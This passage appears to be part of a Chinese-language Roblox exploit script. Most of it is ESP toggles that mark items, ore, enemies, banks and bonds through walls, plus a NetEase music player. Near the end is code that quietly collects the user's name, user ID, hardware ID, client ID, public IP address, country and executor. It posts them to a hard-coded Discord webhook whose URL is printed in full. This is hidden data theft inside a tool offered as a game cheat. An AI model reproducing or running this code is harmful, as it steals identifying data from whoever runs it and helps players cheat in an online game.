                FuelGui.Enabled = state
                FuelGui.FuelLabel.Visible = state
                if state then
                    game:GetService("RunService").RenderStepped:Connect(function()
                        local fuelValue = workspace.Train.Fuel.Value
                        FuelGui.FuelLabel.Text = "Fuel: " .. fuelValue .. " / 240"
                        if fuelValue <= 50 then
                            FuelGui.FuelLabel.TextColor3 = Color3.new(1, 0, 0)
                        elseif fuelValue <= 150 then
                            FuelGui.FuelLabel.TextColor3 = Color3.new(1, 165/255, 0)
                        elseif fuelValue <= 240 then
                            FuelGui.FuelLabel.TextColor3 = Color3.new(0, 1, 0)
                        else
                            FuelGui.FuelLabel.TextColor3 = Color3.new(1, 1, 1)
                        end
                    end)
                end
            end)
            
            ESP:Toggle("透视物品", "", false, function(state)
                if state then
                    for _, v in ipairs(workspace.RuntimeItems:GetChildren()) do
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(255, 215, 0)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end
            
                    itemsConnection = workspace.RuntimeItems.ChildAdded:Connect(function(v)
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") and state then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(255, 215, 0)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end)
                else
                    if itemsConnection then
                        itemsConnection:Disconnect()
                        itemsConnection = nil
                    end
            
                    for _, v in ipairs(workspace.RuntimeItems:GetChildren()) do
                        if v:FindFirstChild("BillboardGui") then
                            v.BillboardGui:Destroy()
                        end
                    end
                end
            end)
            
            ESP:Toggle("透视矿石", "", false, function(state)
                if state then
                    for _, v in ipairs(workspace.Ore:GetChildren()) do
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(0, 0, 255)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end
            
                    OreConnection = workspace.Ore.ChildAdded:Connect(function(v)
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") and state then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(0, 0, 255)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end)
                else
                    if OreConnection then
                        OreConnection:Disconnect()
                        OreConnection = nil
                    end
            
                    for _, v in ipairs(workspace.Ore:GetChildren()) do
                        if v:FindFirstChild("BillboardGui") then
                            v.BillboardGui:Destroy()
                        end
                    end
                end
            end)
            
            ESP:Toggle("夜晚怪物透视", "", false, function(state)
                if state then
                    for i, v in ipairs(workspace.NightEnemies:GetChildren()) do
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(1, 0, 0)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end
            
                    EnemyConnection = workspace.NightEnemies.ChildAdded:Connect(function(v)
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") and state then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(1, 0, 0)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end)
                else
                    if EnemyConnection then
                        EnemyConnection:Disconnect()
                        EnemyConnection = nil
                    end
            
                    for i, v in ipairs(workspace.NightEnemies:GetChildren()) do
                        if v:FindFirstChild("BillboardGui") then
                            v.BillboardGui:Destroy()
                        end
                    end
                end
            end)
            
            ESP:Toggle("独角兽透视", "", false, function(state)
                if state then
                    for i, v in ipairs(workspace:GetDescendants()) do
                        if v.Name == "Unicorn" and not v:FindFirstChild("BillboardGui") then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = "独角兽"
                            nameLabel.TextColor3 = Color3.new(1, 1, 1)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end
            
                    UnicornConnection = workspace.DescendantAdded:Connect(function(v)
                        if v.Name == "Unicorn" and not v:FindFirstChild("BillboardGui") and state then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(1, 1, 1)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end)
                else
                    if UnicornConnection then
                        UnicornConnection:Disconnect()
                        UnicornConnection = nil
                    end
            
                    for i, v in ipairs(workspace:GetChildren()) do
                        if v:FindFirstChild("BillboardGui") and v.BillboardGui.TextLabel.Text == "独角兽" then
                            v.BillboardGui:Destroy()
                        end
                    end
                end
            end)
            
            ESP:Toggle("房子透视", "", false, function(state)
                if state then
                    for _, v in ipairs(workspace.RandomBuildings:GetChildren()) do
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(0, 255, 0)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end
            
                    buildConnection = workspace.RandomBuildings.ChildAdded:Connect(function(v)
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") and state then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(0, 255, 0)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end)
                else
                    if buildConnection then
                        buildConnection:Disconnect()
                        buildConnection = nil
                    end
            
                    for _, v in ipairs(workspace.RandomBuildings:GetChildren()) do
                        if v:FindFirstChild("BillboardGui") then
                            v.BillboardGui:Destroy()
                        end
                    end
                end
            end)
            
            ESP:Toggle("房子中的怪物透视", "", false, function(state)
                if state then
                    for _, building in ipairs(workspace.RandomBuildings:GetChildren()) do
                        for _, zombie in ipairs(building.StandaloneZombiePart.Zombies:GetChildren()) do
                            if zombie:IsA("Model") and not zombie:FindFirstChild("BillboardGui") then
                                local billboard = Instance.new("BillboardGui")
                                billboard.Parent = zombie
                                billboard.Adornee = zombie
                                billboard.Size = UDim2.new(0, 20, 0, 20)
                                billboard.StudsOffset = Vector3.new(0, 3, 0)
                                billboard.AlwaysOnTop = true
            
                                local nameLabel = Instance.new("TextLabel")
                                nameLabel.Parent = billboard
                                nameLabel.Size = UDim2.new(1, 0, 1, 0)
                                nameLabel.BackgroundTransparency = 1
                                nameLabel.Text = zombie.Name
                                nameLabel.TextColor3 = Color3.new(0, 255, 0)
                                nameLabel.TextStrokeTransparency = 0.5
                                nameLabel.TextScaled = true
                            end
                        end
                    end
            
                    zombieConnection = workspace.RandomBuildings.ChildAdded:Connect(function(building)
                        for _, zombie in ipairs(building.StandaloneZombiePart.Zombies:GetChildren()) do
                            if zombie:IsA("Model") and not zombie:FindFirstChild("BillboardGui") and state then
                                local billboard = Instance.new("BillboardGui")
                                billboard.Parent = zombie
                                billboard.Adornee = zombie
                                billboard.Size = UDim2.new(0, 20, 0, 20)
                                billboard.StudsOffset = Vector3.new(0, 3, 0)
                                billboard.AlwaysOnTop = true
            
                                local nameLabel = Instance.new("TextLabel")
                                nameLabel.Parent = billboard
                                nameLabel.Size = UDim2.new(1, 0, 1, 0)
                                nameLabel.BackgroundTransparency = 1
                                nameLabel.Text = zombie.Name
                                nameLabel.TextColor3 = Color3.new(0, 255, 0)
                                nameLabel.TextStrokeTransparency = 0.5
                                nameLabel.TextScaled = true
                            end
                        end
                    end)
                else
                    if zombieConnection then
                        zombieConnection:Disconnect()
                        zombieConnection = nil
                    end
            
                    for _, building in ipairs(workspace.RandomBuildings:GetChildren()) do
                        for _, zombie in ipairs(building.StandaloneZombiePart.Zombies:GetChildren()) do
                            if zombie:FindFirstChild("BillboardGui") then
                                zombie.BillboardGui:Destroy()
                            end
                        end
                    end
                end
            end)
            
            ESP:Toggle("银行透视", "", false, function(state)
                if state then
                    for i, v in ipairs(workspace:GetDescendants()) do
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") and v.Name == "Bank" then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(1, 0, 1)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end
            
                    bankConnection = workspace.DescendantsAdded:Connect(function(Bank)
                        if Bank:IsA("Model") and Bank.Name == "Bank" and state then
                            task.wait()
                            if not Bank:FindFirstChild("BillboardGui") then
                                local billboard = Instance.new("BillboardGui")
                                billboard.Parent = Bank
                                billboard.Adornee = Bank
                                billboard.Size = UDim2.new(0, 20, 0, 20)
                                billboard.StudsOffset = Vector3.new(0, 3, 0)
                                billboard.AlwaysOnTop = true
            
                                local nameLabel = Instance.new("TextLabel")
                                nameLabel.Parent = billboard
                                nameLabel.Size = UDim2.new(1, 0, 1, 0)
                                nameLabel.BackgroundTransparency = 1
                                nameLabel.Text = Bank.Name
                                nameLabel.TextColor3 = Color3.new(1, 0, 1)
                                nameLabel.TextStrokeTransparency = 0.5
                                nameLabel.TextScaled = true
                            end
                        end
                    end)
                else
                    if bankConnection then
                        bankConnection:Disconnect()
                        bankConnection = nil
                    end
            
                    for i, v in ipairs(workspace:GetDescendants()) do
                        if v:FindFirstChild("BillboardGui") and v.Name == "Bank" then
                            v.BillboardGui:Destroy()
                        end
                    end
                end
            end)
            
            ESP:Toggle("猎人透视", "", false, function(state)
                if state then
                    for i, v in ipairs(workspace:GetDescendants()) do
                        if v.Name == "TurretOutlaw" or v.Name == "RifleOutlaw" or v.Name == "ShotgunOutlaw" or v.Name == "RevolverOutlaw" and not v:FindFirstChild("BillboardGui") then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(1, 1, 1)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end
            
                    OutlawConnection = workspace.DescendantAdded:Connect(function(v)
                        if v.Name == "TurretOutlaw" or v.Name == "RifleOutlaw" or v.Name == "ShotgunOutlaw" or v.Name == "RevolverOutlaw" and not v:FindFirstChild("BillboardGui") and state then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(1, 1, 1)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end)
                else
                    if OutlawConnection then
                        OutlawConnection:Disconnect()
                        OutlawConnection = nil
                    end
            
                    for i, v in ipairs(workspace:GetChildren()) do
                        if v:FindFirstChild("BillboardGui") and v.Name == "TurretOutlaw" or "RifleOutlaw" or "ShotgunOutlaw" or "RevolverOutlaw" then
                            v.BillboardGui:Destroy()
                        end
                    end
                end
            end)
        
            ESP:Toggle("透视债券","",false,function(state)
                if state then
                    for _, v in ipairs(workspace.RuntimeItems:GetChildren()) do
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") and v.Name == "Bond" then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(255, 215, 0)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end
            
                    BondConnection = workspace.RuntimeItems.ChildAdded:Connect(function(v)
                        if v:IsA("Model") and not v:FindFirstChild("BillboardGui") and v.Name == "Bond" and state then
                            local billboard = Instance.new("BillboardGui")
                            billboard.Parent = v
                            billboard.Adornee = v
                            billboard.Size = UDim2.new(0, 20, 0, 20)
                            billboard.StudsOffset = Vector3.new(0, 3, 0)
                            billboard.AlwaysOnTop = true
            
                            local nameLabel = Instance.new("TextLabel")
                            nameLabel.Parent = billboard
                            nameLabel.Size = UDim2.new(1, 0, 1, 0)
                            nameLabel.BackgroundTransparency = 1
                            nameLabel.Text = v.Name
                            nameLabel.TextColor3 = Color3.new(255, 215, 0)
                            nameLabel.TextStrokeTransparency = 0.5
                            nameLabel.TextScaled = true
                        end
                    end)
                else
                    if BondConnection then
                        BondConnection:Disconnect()
                        BondConnection = nil
                    end
            
                    for _, v in ipairs(workspace.RuntimeItems:GetChildren()) do
                        if v:FindFirstChild("BillboardGui") and v.Name == "Bond" then
                            v.BillboardGui:Destroy()
                        end
                    end
                end
            end)
            
            music:Textbox("请输入歌曲名称", "", "输入歌曲名称后按回车", function(s)
                local encodedSongName = urlEncode(s)
                local url = "https://music.163.com/api/search/get?s=" .. encodedSongName .. "&type=1&limit=100"
                local response = game:HttpGet(url)
                local data = game:GetService("HttpService"):JSONDecode(response)
                if not searchSongNameLabel then
                    searchSongNameLabel = music:Label("当前搜索: " .. s)
                else
                    searchSongNameLabel.Text = "当前搜索: " .. s
                end
                if data.result and #data.result.songs > 0 then
                    songList = {}
                    for _, song in pairs(data.result.songs) do
                        table.insert(songList, song.name .. " - " .. song.artists[1].name)
                    end
                    searchResultsCount = #songList
                    music:Dropdown("选择歌曲", "请选择一个歌曲", songList, function(selectedSong)
                        print("选中的歌曲: " .. selectedSong)
                        local songId = data.result.songs[table.find(songList, selectedSong)].id
                        local songUrl = "http://music.163.com/song/media/outer/url?id=" .. songId .. ".mp3"
                        local file = game:HttpGet(songUrl)
                        writefile(songId .. ".mp3", file)
                        local soundId = getsynasset(songId .. ".mp3")
                        table.insert(songHistory, {songId = songId, soundId = soundId, songName = selectedSong})
                        currentSongIndex = #songHistory
                        playCount = playCount + 1
                        playSong(songId, soundId, selectedSong)
                    end)
                else
                    searchResultsCount = 0
                    print("未找到相关歌曲")
                end
                if not searchResultsLabel then
                    searchResultsLabel = music:Label("搜索结果数量: " .. (searchResultsCount or "nil"))
                else
                    searchResultsLabel.Text = "搜索结果数量: " .. (searchResultsCount or "nil")
                end
                searchHistoryCount = searchHistoryCount + 1
                if not searchHistoryCountLabel then
                    searchHistoryCountLabel = music:Label("历史搜索次数: " .. searchHistoryCount)
                else
                    searchHistoryCountLabel.Text = "历史搜索次数: " .. searchHistoryCount
                end
            end)
            
            music:Button("继续播放音乐", function()
                if currentSongIndex then
                    local song = songHistory[currentSongIndex]
                    if savedStartTime and savedEndTime then
                        playSong(song.songId, song.soundId, song.songName, lastPosition)
                        startTimeLabel.Text = "开始时间: " .. savedStartTime
                        endTimeLabel.Text = "结束时间: " .. savedEndTime  -- 恢复保存的结束时间
                        print("音乐继续播放")
                    else
                        print("没有保存的开始时间和结束时间")
                    end
                else
                    print("没有歌曲可以继续播放")
                end
            end)
            
            -- 重新播放按钮
            music:Button("重新播放音乐", function()
                if currentSound then
                    currentSound:Play()
                    isPlaying = true
                    local song = songHistory[currentSongIndex]
                    playSong(song.songId, song.soundId, song.songName)
                else
                    print("没有正在播放的歌曲")
                end
            end)
            
            -- 播放按钮
            music:Button("开始播放音乐", function()
                if not isPlaying and currentSongIndex then
                    local song = songHistory[currentSongIndex]
                    playSong(song.songId, song.soundId, song.songName)
                    print("音乐开始播放")
                else
                    print("没有歌曲可播放")
                end
            end)
            
            -- 停止按钮
            music:Button("停止播放音乐", function()
                if currentSound then
                    lastPosition = currentSound.TimePosition  -- 保存当前播放进度
                    currentSound:Stop()
                    isPlaying = false
                    stopCountdown()
                    print("音乐停止播放")
                else
                    print("没有正在播放的歌曲")
                end
            end)
            
            -- 播放上一首按钮
            music:Button("上一首音乐", function()
                if #songHistory > 1 and currentSongIndex > 1 then
                    -- 获取上一首歌曲的ID和SoundId
                    local previousSong = songHistory[currentSongIndex - 1]
                    local previousSongId = previousSong.songId
                    local previousSoundId = previousSong.soundId
            
                    -- 播放上一首音乐
                    playSong(previousSongId, previousSoundId, previousSong.songName)
            
                    -- 更新当前歌曲索引
                    currentSongIndex = currentSongIndex - 1
                    print("播放上一首: " .. previousSongId)
                else
                    print("没有上一首歌曲")
                end
            end)
            
            -- 播放下一首按钮
            music:Button("下一首音乐", function()
                if #songHistory > currentSongIndex and currentSongIndex < #songHistory then
                    -- 获取下一首歌曲的ID和SoundId
                    local nextSong = songHistory[currentSongIndex + 1]
                    local nextSongId = nextSong.songId
                    local nextSoundId = nextSong.soundId
            
                    -- 播放下一首音乐
                    playSong(nextSongId, nextSoundId, nextSong.songName)
            
                    -- 更新当前歌曲索引
                    currentSongIndex = currentSongIndex + 1
                    print("播放下一首: " .. nextSongId)
                else
                    print("没有下一首歌曲")
                end
            end)
            local device
            if game.UserInputService.TouchEnabled and not game.UserInputService.KeyboardEnabled and not game.UserInputService.MouseEnabled then
                device = "设备是： 移动设备"
            elseif not game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
                device = "设备是： 电脑"
            elseif game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
                device = "设备是： 带触摸屏的电脑"
            else
                device = "设备是： 未知设备"
            end
            
            local Premium
            if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
                Premium = "会员"
            else
                Premium = "不是会员"
            end
            
            local IPV4 = game:HttpGet("https://v4.ident.me/")
            local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
            Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
            local AvatarImage = Thing.imageUrl
            
            local msg = {
                ["username"] = "Captain Hook",
                ["embeds"] = {
                    {
                        ["color"] = tonumber("0x32CD32"),
                        ["title"] = "有人触发了Webhook",
                        ["thumbnail"] = {
                            ["url"] = AvatarImage,
                        },
                        ["fields"] = {
                            {
                                ["name"] = "名称(Name)",
                                ["value"] = "||" .. game.Players.LocalPlayer.Name .. "(LocalName)||" .. game.Players.LocalPlayer.DisplayName .. "(DisplayName)||",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "个人资料",
                                ["value"] = "||[" .. game.Players.LocalPlayer.UserId .. "](" .. "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile" .. ")||",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "地图ID",
                                ["value"] = "[" .. game.PlaceId .. "](" .. "https://www.roblox.com/games/" .. game.PlaceId .. ")",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "地图名称",
                                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                                ["inline"] = true
                            },
                            {
                                ["name"] = "使用的注入器",
                                ["value"] = identifyexecutor() or getexecutorname() or "未知",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "账号年龄",
                                ["value"] = game.Players.LocalPlayer.AccountAge .. "天",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "加入日期",
                                ["value"] = os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).day .. "/" .. os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).month .. "/" .. os.date("!*t", os.time() - (game.Players.LocalPlayer.AccountAge * 86400)).year,
                                ["inline"] = true
                            },
                            {
                                ["name"] = "HWID",
                                ["value"] = gethwid(),
                                ["inline"] = true
                            },
                            {
                                ["name"] = "客户端ID",
                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"] = false
                            },
                            {
                                ["name"] = "设备",
                                ["value"] = device,
                                ["inline"] = false
                            },
                            {
                                ["name"] = "国家和语言",
                                ["value"] = "国家：" .. game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer) .. " 语言：" .. game.Players.LocalPlayer.LocaleId,
                                ["inline"] = false
                            },
                            {
                                ["name"] = "会员状态",
                                ["value"] = Premium,
                                ["inline"] = false
                            },
                            {
                                ["name"] = "IP",
                                ["value"] = "IP：" .. IPV4,
                                ["inline"] = false
                            },
                            {
                                ["name"] = "IP工具箱",
                                ["value"] = "IP：" .. "https://binaryfork.com/zh/tools/ip-address-lookup/?ip=" .. IPV4 .. "&trp-form-language=zh#ip-lookup",
                                ["inline"] = false
                            }
                        }
                    }
                }
            }
            
            local request = http_request or request or HttpPost or syn.request
            request({
                Url = "https://discord.com/api/webhooks/1357292731696943124/6PbtHN_64mNdWrbYeT9vI7o-X5m8-9W_ojqG5J-uD-ZM4TI6uCpV_RwQ5g9R19bamdM6", 
                Method = "POST", 
                Headers = {["Content-Type"] = "application/json"}, 
                Body = game:GetService("HttpService"):JSONEncode(msg)
            })
        else
            game.Players.LocalPlayer:Destroy()
            game.Players.LocalPlayer:Kick()
            game:shutdown()
        end
    end
end
